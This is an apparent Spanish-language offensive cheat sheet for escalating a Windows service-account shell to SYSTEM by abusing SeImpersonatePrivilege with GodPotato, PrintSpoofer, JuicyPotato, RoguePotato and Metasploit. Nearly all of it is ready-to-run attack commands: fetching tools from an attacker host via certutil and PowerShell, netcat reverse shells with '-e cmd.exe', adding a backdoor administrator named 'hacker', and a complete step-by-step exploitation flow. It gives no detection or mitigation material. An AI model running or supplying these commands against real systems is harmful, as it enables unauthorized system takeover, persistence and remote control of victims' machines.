## SeImpersonatePrivilege

`SeImpersonatePrivilege` permite a un proceso impersonar el token de seguridad de otro proceso o usuario. Está habilitado por defecto en cuentas de servicio como `IIS AppPool`, `Network Service`, `Local Service` y en cualquier shell obtenida via exploit web sobre IIS, MSSQL, etc.

El abuso consiste en forzar a un proceso privilegiado (SYSTEM) a autenticarse contra un named pipe controlado por el atacante — capturando y reutilizando su token para ejecutar comandos como SYSTEM.

### Verificar el privilegio

```cmd
whoami /priv
```

Buscar en la salida:

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

---

## Elección de herramienta según la versión de Windows

| Herramienta | Sistemas compatibles | Observaciones |
| ----------- | -------------------- | ------------- |
| **JuicyPotato** | Windows 7 — Server 2016 (hasta build 1803) | No funciona en Server 2019+ |
| **PrintSpoofer** | Windows 10 / Server 2016-2019+ | Requiere Print Spooler activo |
| **RoguePotato** | Windows 10 / Server 2019+ | Alternativa a JuicyPotato en sistemas modernos |
| **GodPotato** | Windows Server 2012 — 2022 / Win 10-11 | El más compatible actualmente |
| **SigmaPotato** | Windows Server 2012 — 2022 / Win 10-11 | Fork de GodPotato — ejecución en memoria |

> 💡 En la práctica: probar primero **GodPotato** (compatibilidad máxima) y **PrintSpoofer** como alternativa. JuicyPotato solo si el sistema es antiguo.

---

## Identificar la versión de .NET (para GodPotato)

```cmd
dir C:\Windows\Microsoft.NET\Framework\ /b
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s | findstr /i version
```

| Versión .NET | Binario a usar |
| ------------ | -------------- |
| .NET 2.0 | `GodPotato-NET2.exe` |
| .NET 3.5 | `GodPotato-NET35.exe` |
| .NET 4.0+ | `GodPotato-NET4.exe` |

---

## Transferir herramientas al objetivo

```powershell
# Via PowerShell
Invoke-WebRequest "http://<ip_atacante>/GodPotato-NET4.exe" -OutFile "C:\Windows\Temp\gp.exe"
(New-Object System.Net.WebClient).DownloadFile("http://<ip_atacante>/nc.exe","C:\Windows\Temp\nc.exe")

# Via certutil (no requiere PowerShell)
certutil -urlcache -split -f http://<ip_atacante>/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
```

---

## GodPotato

La opción más moderna y compatible. Funciona incluso cuando Print Spooler está deshabilitado — usa DCOM en su lugar.

```cmd
# Spawn cmd.exe como SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Reverse shell con netcat
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <ip_atacante> 443 -e cmd.exe"

# Añadir usuario administrador
.\GodPotato-NET4.exe -cmd "net user hacker Password123! /add && net localgroup administrators hacker /add"

# Ejecutar payload MSFvenom
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\shell.exe"
```

---

## PrintSpoofer

Abusa del servicio Print Spooler para capturar el token SYSTEM via named pipe.

```cmd
# Spawn cmd.exe como SYSTEM en la consola actual
.\PrintSpoofer64.exe -i -c cmd

# Reverse shell
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <ip_atacante> 443 -e cmd.exe"

# Ejecutar comando directo
.\PrintSpoofer64.exe -c "whoami"
```

> ⚠️ Requiere que el servicio **Print Spooler** esté activo. Verificar con: `sc query spooler`

---

## JuicyPotato (sistemas antiguos)

Para sistemas Windows 7 — Server 2016. Requiere un CLSID válido para el sistema objetivo.

```cmd
# Obtener CLSIDs válidos para el sistema
# Consultar: https://github.com/ohpe/juicy-potato/tree/master/CLSID

# Reverse shell
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe \
  -a "<ip_atacante> 443 -e cmd.exe" \
  -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Ejecutar comando
.\JuicyPotato.exe -l 1337 -p cmd.exe \
  -a "/c net user hacker Password123! /add" \
  -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

> 💡 Si el CLSID por defecto no funciona, buscar uno válido para la versión exacta del sistema en: https://github.com/ohpe/juicy-potato/tree/master/CLSID

---

## RoguePotato (Server 2019+)

Alternativa a JuicyPotato para sistemas modernos donde este no funciona.

```cmd
# En el atacante — levantar socat para redirigir el tráfico OXID
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:<ip_objetivo>:9999

# En el objetivo — ejecutar RoguePotato
.\RoguePotato.exe -r <ip_atacante> -e "C:\Windows\Temp\nc.exe <ip_atacante> 443 -e cmd.exe" -l 9999
```

---

## Via Metasploit (Meterpreter)

Si se tiene una sesión Meterpreter activa:

```
meterpreter > getsystem
meterpreter > getuid

# Si getsystem falla, usar el módulo JuicyPotato
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION <id_sesion>
set LHOST <ip_atacante>
run
```

---

## Flujo completo de ejemplo (GodPotato + netcat)

```cmd
# 1. En el atacante — levantar listener
nc -lvnp 443

# 2. En el objetivo — transferir herramientas
certutil -urlcache -split -f http://<ip>/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
certutil -urlcache -split -f http://<ip>/nc.exe C:\Windows\Temp\nc.exe

# 3. Explotar
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe <ip_atacante> 443 -e cmd.exe"

# 4. Verificar en la shell obtenida
whoami
# nt authority\system
```

---

### Referencias

- https://github.com/BeichenDream/GodPotato
- https://github.com/itm4n/PrintSpoofer
- https://github.com/ohpe/juicy-potato
- https://github.com/antonioCoco/RoguePotato
- https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
- https://jlajara.gitlab.io/Potatoes_Windows_Privesc
